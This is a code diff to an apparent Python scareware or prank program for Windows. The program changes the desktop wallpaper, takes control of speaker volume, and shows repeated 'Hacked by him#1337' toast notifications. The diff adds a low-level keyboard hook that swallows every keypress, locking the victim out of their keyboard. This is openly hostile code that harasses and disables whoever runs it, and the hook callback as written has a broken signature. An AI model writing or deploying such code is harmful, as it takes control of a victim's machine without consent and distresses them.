@@ -3,16 +3,19 @@ import ctypes
 import pygame
 import threading
 import random
-from ctypes import cast, POINTER
+from ctypes import cast, POINTER ,wintypes
 import win32api
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from win10toast import ToastNotifier
-import time
 
 ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)
 
 class Threadlib:
+    WH_KEYBOARD_LL = 13
+    WM_KEYDOWN = 0x0100
+    HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
+
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -27,7 +30,18 @@ class Threadlib:
             
     @staticmethod
     def keepkeyboard():
-        ctypes.windll.user32.BlockInput(True)
+        hook = Threadlib.HOOKPROC(Threadlib.hook_callback)
+        user32 = ctypes.windll.user32
+        hook_id = user32.SetWindowsHookExW(Threadlib.WH_KEYBOARD_LL, hook, None, 0)
+
+
+        msg = wintypes.MSG()
+        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
+            user32.TranslateMessage(ctypes.byref(msg))
+            user32.DispatchMessageW(ctypes.byref(msg))
+
+        user32.UnhookWindowsHookEx(hook_id)
+
     @staticmethod
     def setwave():
         while True:
@@ -36,9 +50,14 @@ class Threadlib:
     def sendmessage():
         toaster = ToastNotifier()
         while True:
-            toaster.show_toast("Hacked by him#1337", text[random.randint(0,3)])
-            time.sleep(random.randint(10,100))
-
+            toaster.show_toast("Hacked by him#1337", Threadlib.text[random.randint(0,3)])
+    @classmethod
+    def hook_callback(nCode, wParam, lParam):
+        if wParam == Threadlib.WM_KEYDOWN:
+            
+            return 1  
+        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+    
 def show():
     pygame.init()
     pygame.display.set_caption("yebuji")
